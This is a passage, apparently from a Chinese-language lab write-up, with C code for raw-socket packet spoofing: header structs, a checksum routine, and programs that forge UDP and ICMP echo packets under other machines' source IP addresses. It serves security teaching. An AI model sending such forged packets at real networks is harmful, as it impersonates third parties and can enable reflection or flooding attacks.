class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//myheader.h</span><br><span class="hljs-comment">/* Ethernet header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ethheader</span> &#123;</span><br>    u_char  ether_dhost[<span class="hljs-number">6</span>];    <span class="hljs-comment">/* destination host address */</span><br>    u_char  ether_shost[<span class="hljs-number">6</span>];    <span class="hljs-comment">/* source host address */</span><br>    u_short ether_type;                     <span class="hljs-comment">/* IP? ARP? RARP? etc */</span><br>&#125;;<br><br><span class="hljs-comment">/* IP Header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">//IP header length</span><br>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">//IP version</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_tos; <span class="hljs-comment">//Type of service</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_len; <span class="hljs-comment">//IP Packet length (data + header)</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_ident; <span class="hljs-comment">//Identification</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">//Fragmentation flags</span><br>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">//Flags offset</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ttl; <span class="hljs-comment">//Time to Live</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_protocol; <span class="hljs-comment">//Protocol type</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_chksum; <span class="hljs-comment">//IP datagram checksum</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">//Source IP address</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">//Destination IP address</span><br>&#125;;<br><br><span class="hljs-comment">/* ICMP Header  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmpheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> icmp_type; <span class="hljs-comment">// ICMP message type</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> icmp_code; <span class="hljs-comment">// Error code</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> icmp_chksum; <span class="hljs-comment">//Checksum for ICMP Header and data</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> icmp_id;     <span class="hljs-comment">//Used for identifying request</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> icmp_seq;    <span class="hljs-comment">//Sequence number</span><br>&#125;;<br><br><span class="hljs-comment">/* UDP Header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udpheader</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">u_int16_t</span> udp_sport;           <span class="hljs-comment">/* source port */</span><br>  <span class="hljs-type">u_int16_t</span> udp_dport;           <span class="hljs-comment">/* destination port */</span><br>  <span class="hljs-type">u_int16_t</span> udp_ulen;            <span class="hljs-comment">/* udp length */</span><br>  <span class="hljs-type">u_int16_t</span> udp_sum;             <span class="hljs-comment">/* udp checksum */</span><br>&#125;;<br><br><span class="hljs-comment">/* TCP Header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcpheader</span> &#123;</span><br>    u_short tcp_sport;               <span class="hljs-comment">/* source port */</span><br>    u_short tcp_dport;               <span class="hljs-comment">/* destination port */</span><br>    u_int   tcp_seq;                 <span class="hljs-comment">/* sequence number */</span><br>    u_int   tcp_ack;                 <span class="hljs-comment">/* acknowledgement number */</span><br>    u_char  tcp_offx2;               <span class="hljs-comment">/* data offset, rsvd */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_OFF(th)      (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4)</span><br>    u_char  tcp_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_FIN  0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_SYN  0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_RST  0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_PUSH 0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_ACK  0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_URG  0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_ECE  0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_CWR  0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br>    u_short tcp_win;                 <span class="hljs-comment">/* window */</span><br>    u_short tcp_sum;                 <span class="hljs-comment">/* checksum */</span><br>    u_short tcp_urp;                 <span class="hljs-comment">/* urgent pointer */</span><br>&#125;;<br><br><span class="hljs-comment">/* Psuedo TCP header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pseudo_tcp</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">unsigned</span> saddr, daddr;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mbz;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ptcl;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> tcpl;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcpheader</span> <span class="hljs-title">tcp</span>;</span><br>        <span class="hljs-type">char</span> payload[<span class="hljs-number">1500</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//checksum.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myheader.h&quot;</span></span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-title function_">in_cksum</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *buf, <span class="hljs-type">int</span> length)</span><br>&#123;<br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *w = buf;<br>   <span class="hljs-type">int</span> nleft = length;<br>   <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> temp=<span class="hljs-number">0</span>;<br><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * The algorithm uses a 32 bit accumulator (sum), adds</span><br><span class="hljs-comment">    * sequential 16 bit words to it, and at the end, folds back all</span><br><span class="hljs-comment">    * the carry bits from the top 16 bits into the lower 16 bits.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">while</span> (nleft &gt; <span class="hljs-number">1</span>)  &#123;<br>       sum += *w++;<br>       nleft -= <span class="hljs-number">2</span>;<br>   &#125;<br><br>   <span class="hljs-comment">/* treat the odd byte at the end, if any */</span><br>   <span class="hljs-keyword">if</span> (nleft == <span class="hljs-number">1</span>) &#123;<br>        *(u_char *)(&amp;temp) = *(u_char *)w ;<br>        sum += temp;<br>   &#125;<br><br>   <span class="hljs-comment">/* add back carry outs from top 16 bits to low 16 bits */</span><br>   sum = (sum &gt;&gt; <span class="hljs-number">16</span>) + (sum &amp; <span class="hljs-number">0xffff</span>);  <span class="hljs-comment">// add hi 16 to low 16</span><br>   sum += (sum &gt;&gt; <span class="hljs-number">16</span>);                  <span class="hljs-comment">// add carry</span><br>   <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>)(~sum);<br>&#125;<br><br><span class="hljs-comment">/****************************************************************</span><br><span class="hljs-comment">  TCP checksum is calculated on the pseudo header, which includes</span><br><span class="hljs-comment">  the TCP header and data, plus some part of the IP header.</span><br><span class="hljs-comment">  Therefore, we need to construct the pseudo header first.</span><br><span class="hljs-comment">*****************************************************************/</span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-title function_">calculate_tcp_checksum</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipheader *ip)</span><br>&#123;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcpheader</span> *<span class="hljs-title">tcp</span> =</span> (<span class="hljs-keyword">struct</span> tcpheader *)((u_char *)ip +<br>                            <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader));<br><br>   <span class="hljs-type">int</span> tcp_len = ntohs(ip-&gt;iph_len) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader);<br><br>   <span class="hljs-comment">/* pseudo tcp header for the checksum computation */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pseudo_tcp</span> <span class="hljs-title">p_tcp</span>;</span><br>   <span class="hljs-built_in">memset</span>(&amp;p_tcp, <span class="hljs-number">0x0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pseudo_tcp));<br><br>   p_tcp.saddr  = ip-&gt;iph_sourceip.s_addr;<br>   p_tcp.daddr  = ip-&gt;iph_destip.s_addr;<br>   p_tcp.mbz    = <span class="hljs-number">0</span>;<br>   p_tcp.ptcl   = IPPROTO_TCP;<br>   p_tcp.tcpl   = htons(tcp_len);<br>   <span class="hljs-built_in">memcpy</span>(&amp;p_tcp.tcp, tcp, tcp_len);<br><br>   <span class="hljs-keyword">return</span>  (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>) in_cksum((<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *)&amp;p_tcp,<br>                                     tcp_len + <span class="hljs-number">12</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//spoof.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myheader.h&quot;</span></span><br><br><span class="hljs-comment">/*************************************************************</span><br><span class="hljs-comment"> 给定一个 IP 数据包，使用原始套接字将其发送出去。</span><br><span class="hljs-comment">**************************************************************/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_ip_packet</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipheader* ip)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span><br>    <span class="hljs-type">int</span> enable = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// Step 1: Create a raw network socket.</span><br>    <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sock: %d\n&quot;</span>, sock);<br><br>    <span class="hljs-comment">// Step 2: Set socket option.</span><br>    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,<br>                     &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));<br><br>    <span class="hljs-comment">// Step 3: Provide needed information about destination.</span><br>    dest_info.sin_family = AF_INET;<br>    dest_info.sin_addr = ip-&gt;iph_destip;<br><br>    <span class="hljs-comment">// Step 4: Send the packet out.</span><br>    <span class="hljs-comment">// ntohs 是一个网络编程中常用的函数，它的作用是将一个16位无符号短整型数从网络字节序转换为主机字节序。</span><br>    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="hljs-number">0</span>,<br>           (<span class="hljs-keyword">struct</span> sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));<br>    close(sock);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="task-2.2a-write-a-spoofing-program">Task 2.2A: Write a spoofingprogram</h3><p>请用 C 语言编写自己的数据包欺骗程序。您需要提供证据（如 Wireshark数据包跟踪）来证明您的程序成功发送了欺骗的 IP 数据包。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码实现：初始化缓冲区：创建一个大小为1500字节的缓冲区，并将其所有元素初始化为0。获取IP和UDP头指针：使用结构体指针将缓冲区划分成IP头和UDP头的部分。填充UDP数据部分：在缓冲区中留出空间存储UDP数据，并将消息 "Hello Server!"复制到这个位置。填充UDP头部：设置UDP头的源端口、目标端口、UDP长度和校验和；填充IP头部：设置IP头的版本、首部长度、TTL、源IP地址、目标IP地址、协议（UDP协议的值为17）和总长度。发送伪造的IP数据包：调用 send_raw_ip_packet 函数发送伪造的IP数据包。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myheader.h&quot;</span></span><br><br><span class="hljs-type">void</span>   <span class="hljs-title function_">send_raw_ip_packet</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> ipheader* ip)</span>;<br><br><span class="hljs-comment">/******************************************************************</span><br><span class="hljs-comment">  Spoof a UDP packet using an arbitrary source IP Address and port</span><br><span class="hljs-comment">*******************************************************************/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">1500</span>];<br><br>   <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-number">1500</span>);<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udpheader</span> *<span class="hljs-title">udp</span> =</span> (<span class="hljs-keyword">struct</span> udpheader *) (buffer +<br>                                          <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader));<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 1: Fill in the UDP data field.</span><br><span class="hljs-comment">    ********************************************************/</span><br>   <span class="hljs-type">char</span> *data = buffer + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader) +<br>                         <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> udpheader);<br>   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg = <span class="hljs-string">&quot;Hello Server!\n&quot;</span>;<br>   <span class="hljs-type">int</span> data_len = <span class="hljs-built_in">strlen</span>(msg);<br>   <span class="hljs-built_in">strncpy</span> (data, msg, data_len);<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 2: Fill in the UDP header.</span><br><span class="hljs-comment">    ********************************************************/</span><br>   <span class="hljs-comment">// 将一个16位无符号短整型数从主机字节序转换为网络字节序。</span><br>   udp-&gt;udp_sport = htons(<span class="hljs-number">12345</span>);<br>   udp-&gt;udp_dport = htons(<span class="hljs-number">9090</span>);<br>   udp-&gt;udp_ulen = htons(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> udpheader) + data_len);<br>   udp-&gt;udp_sum =  <span class="hljs-number">0</span>; <span class="hljs-comment">/* Many OSes ignore this field, so we do not</span><br><span class="hljs-comment">                         calculate it. */</span><br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 3: Fill in the IP header.</span><br><span class="hljs-comment">    ********************************************************/</span><br>   ip-&gt;iph_ver = <span class="hljs-number">4</span>;<br>   ip-&gt;iph_ihl = <span class="hljs-number">5</span>;<br>   ip-&gt;iph_ttl = <span class="hljs-number">20</span>;<br>    <span class="hljs-comment">// 将点分十进制形式的 IPv4 地址转换为网络字节序的 32 位整数表示的函数</span><br>   ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="hljs-string">&quot;1.1.1.1&quot;</span>);  <span class="hljs-comment">//伪造的源IP</span><br>   ip-&gt;iph_destip.s_addr = inet_addr(<span class="hljs-string">&quot;8.8.8.8&quot;</span>);    <span class="hljs-comment">//伪造的目的IP</span><br>   ip-&gt;iph_protocol = IPPROTO_UDP; <span class="hljs-comment">// The value is 17.</span><br>   ip-&gt;iph_len = htons(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader) +<br>                       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> udpheader) + data_len);<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 4: Finally, send the spoofed packet</span><br><span class="hljs-comment">    ********************************************************/</span><br>   send_raw_ip_packet (ip);<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行结果（编译命令：<code>gcc -o task22A task22A.c spoof.c -lpcap</code>）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813805.png"alt="image-20231115171321466" /><figcaption aria-hidden="true">image-20231115171321466</figcaption></figure></li></ol><h3 id="task-2.2b-spoof-an-icmp-echo-request">Task 2.2B: Spoof an ICMPEcho Request</h3><p>代表另一台机器欺骗一个 ICMP echo 请求数据包（即使用另一台机器的 IP地址作为源 IP地址）。该数据包应发送到互联网上的一台远程机器（该机器必须正常运行）。您应该打开Wireshark，这样如果欺骗成功，您就可以看到远程机器返回的 echo 回应。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码实现：伪造ICMP Echo请求。创建一个大小为 1500字节的缓冲区（buffer），并将其清零。填充 ICMP 头部：在缓冲区中找到 ICMP头部的位置，设置 ICMP 类型为 8（表示请求）。计算并设置 ICMP头部的校验和，以确保数据的完整性。填充 IP 头部：在缓冲区中找到 IP头部的位置，设置 IP 版本为 4、头部长度为 5（表示 20字节的固定长度头部）。设置生存时间（TTL）、源 IP 地址和目标 IP地址。指定上层协议为 ICMP，设置 IP数据包的总长度。调用send_raw_ip_packet 函数，将伪造的 IP数据包发送出去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myheader.h&quot;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-title function_">in_cksum</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *buf, <span class="hljs-type">int</span> length)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_ip_packet</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipheader* ip)</span>;<br><br><span class="hljs-comment">/******************************************************************</span><br><span class="hljs-comment">  Spoof an ICMP echo request using an arbitrary source IP Address</span><br><span class="hljs-comment">*******************************************************************/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">1500</span>];<br><br>   <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-number">1500</span>);<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 1: Fill in the ICMP header.</span><br><span class="hljs-comment">    ********************************************************/</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmpheader</span> *<span class="hljs-title">icmp</span> =</span> (<span class="hljs-keyword">struct</span> icmpheader *)<br>                             (buffer + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader));<br>   icmp-&gt;icmp_type = <span class="hljs-number">8</span>; <span class="hljs-comment">//ICMP Type: 8 is request, 0 is reply.</span><br><br>   <span class="hljs-comment">// Calculate the checksum for integrity</span><br>   icmp-&gt;icmp_chksum = <span class="hljs-number">0</span>;<br>   icmp-&gt;icmp_chksum = in_cksum((<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *)icmp,<br>                                 <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> icmpheader));<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 2: Fill in the IP header.</span><br><span class="hljs-comment">    ********************************************************/</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>   ip-&gt;iph_ver = <span class="hljs-number">4</span>;<br>   ip-&gt;iph_ihl = <span class="hljs-number">5</span>;<br>   ip-&gt;iph_ttl = <span class="hljs-number">20</span>;<br>   ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="hljs-string">&quot;10.9.0.5&quot;</span>);<br>   ip-&gt;iph_destip.s_addr = inet_addr(<span class="hljs-string">&quot;39.156.66.14&quot;</span>);<br>   ip-&gt;iph_protocol = IPPROTO_ICMP;<br>   ip-&gt;iph_len = htons(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader) +<br>                       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> 